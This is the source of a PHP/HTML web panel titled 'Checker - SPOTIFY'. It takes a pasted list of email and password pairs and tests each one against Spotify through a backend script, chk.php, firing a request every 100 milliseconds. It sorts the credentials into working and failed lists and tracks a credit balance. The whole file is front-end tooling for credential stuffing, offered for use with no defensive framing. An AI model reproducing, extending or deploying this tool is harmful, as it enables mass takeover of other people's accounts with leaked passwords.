<?php  
require '../check.php';

?>
<!DOCTYPE html>
<html>     
    <head>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
        <meta charset="utf-8">
        <title>SPOTIFY</title>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
  <style>
  a:link 
{ 
 text-decoration:none; 
} 
  html {
   font-size: 16px;
   background-color: #e8e8e8;
   color: #1ABB9C;
   font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
   overflow: hidden;
 }
 body {    
  background-color: #e8e8e8;
}
.lista {
  width: 95%;
  height: 150px;
  text-align: center;
  resize: none;
  border: 1px ridge rgba(61, 211, 232, 1);
  background-color: #e8e8e8;
  color: rgba(64,64,64, 1);
  font-size: 17px;
  border-radius: 4px;
  overflow: auto;
}
.lista:focus {
  outline: none;
}
.afs {
  font-weight: bold;
              }
            .green {
                background-color: rgba(92, 180, 91, 1);
                color: rgba(255, 255, 255, 0.87);
                padding: 0.25em 0.5em;
                border-radius: 3px;

}
.green {
  background-color: #4caf50;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
.red {
  background-color: #f44336;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
.check {
  background-color: #fcc100;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
            .botao2 {
                margin-top: 10px;
                width: 75px;
                height: 35px;
                background-color: rgba(245, 203, 130, 1);
                border-radius: 4px;
                border: none;
                color: rgba(255, 255, 255, 0.87);
                cursor: pointer;
                -webkit-appearance: button;
                transition: all .2s ease-in-out;
                font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
            }
            .botao2:hover {
                background-color: rgba(255, 255, 255, 0.87);
                color: #2C3A48;
            }
            .botao2:focus {
                outline: none;
            }
            .botao {
                margin-top: 10px;
                width: 75px;
                height: 35px;
                background-color: rgba(85, 216, 234, 1);
                border-radius: 4px;
                border: none;
                color: rgba(255, 255, 255, 0.87);
                cursor: pointer;
                -webkit-appearance: button;
                transition: all .2s ease-in-out;
                font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
}
.botao:hover {
  background-color: rgba(255, 255, 255, 0.87);
  color: #2C3A48;
}
.botao:focus {
  outline: none;
}
.test {
  width: 660px;
  height: 200px;
  text-align: center;
  resize: none;
  border: 1px ridge rgba(61, 211, 232, 1);
  background-color: #e8e8e8;
  color: rgba(64,64,64, 1);
  font-size: 17px;
  border-radius: 4px;
  overflow: auto;
}
.test:focus {
 outline: none;
}
.back {
 color: #1ABB9C;
 text-decoration: none;
}
.back:hover {
  text-shadow: 1px 1px 1px #1ABB9C;
}
</style>
    </head>
    <body>
    <center>
        <br>
        <font color="black"><font size="7">Checker - SPOTIFY</font> <br />
        <font size="3" class="afs">#PainelCheckers©</font>
        <br>
        <br>
        <textarea class="lista" name="text" id="text" placeholder="Lista de email e senha"></textarea>
        <br><br>
             <span id="demo" style="color:orange;">Aguardando Início</span> - Aprovadas : <span id="CLIVE" class="green">0</span> - Reprovadas : <span id="CDIE" class="red">0</span> - Testadas: <span id="testado" class="check">0</span>
        <br>
        <button class="botao" id="testar">Iniciar</button><button type="submit" id="x" name="x" class="botao2" onclick="stop()">Parar</button><input value="|" maxlength="3" class="form-control" style="height: 25px; width: 45px; text-align: center;" name="separador" id="separador" placeholder="|"> <br><br>
    </center>

    <center>

                <textarea class="test" style="color: #00EE00;" id="aprovadas"></textarea>
        </div>
                <textarea class="test" style="color: #FC0F0F;" id="reprovadas"></textarea>

    </center>
    <script>
        var atual_1 = 0;
        var lives = 0;
        var totals = 0;
        var dies = 0;
        var t = 0;
        var looper;
        function q(data) {
            var old = document.getElementById("aprovadas").value;
            var q = data;
            totals++;
            $("#testado").html("" + totals);
            if (q == "FALIDO") {
                document.getElementById("demo").style = "color: purple;";
                $("#demo").html("Sem Moedas");
                clearInterval(looper);
                return;
            }
            if (q.includes("1LOGADO")) {
                lives++;
                $("#CLIVE").html("" + lives);
                var user = q.split("|")[1];
                var senha = q.split("|")[2];
                var status = q.split("|")[3];
                document.getElementById("aprovadas").value = user + " | " + senha + " | " + status + "\n" + old;
            } else {
                dies++;
                $("#CDIE").html("" + dies);
                var user = q.split("|")[1];
                var senha = q.split("|")[2];
                var t_old = document.getElementById("reprovadas").value;
                document.getElementById("reprovadas").value = user + " | " + senha + "\n" + t_old;
            }

            atual_1++;
            if (atual_1 >= t) {
                document.getElementById("testar").disabled = false;
                document.getElementById("text").disabled = false;
                document.getElementById("separador").disabled = false;
            }

        }

        $(document).ready(function ()
        {
            $("#testar").click(function (e) {
                document.getElementById("testar").disabled = true;
                document.getElementById("text").disabled = false;
                document.getElementById("separador").disabled = true;
                lives = 0;
                totals = 0;
                dies = 0;
                atual_1 = 0;
                var lista = $("#text").val();
                var split = lista.split("\n");
                var total = split.length;
                $("#carregada").html("" + total);
                var atual = 0;
                t = total;


                looper = setInterval(function () {

                    document.getElementById("demo").style = "color: lime;";
                    $("#demo").html("Testando");
                    if (atual >= total)
                    {
                        clearInterval(looper);
                        document.getElementById("demo").style = "color: red;";
                        $("#demo").html("Parado");
                        return;
                    }
                    var login = split[atual];
                    var user = login.split("|")[0];
                    var senha = login.split("|")[1];
                    $("#por").serialize();
                    $("#f").serialize();
                    jQuery.ajax({
                        type: "GET",
                        url: "chk.php?email=" + user + "&senha=" + senha,
                        success: function (data)
                        {
                            q(data);
                        }
                    });

                    ++atual;
                }, 100);






            });


        });
    </script>				
</body>
</html>
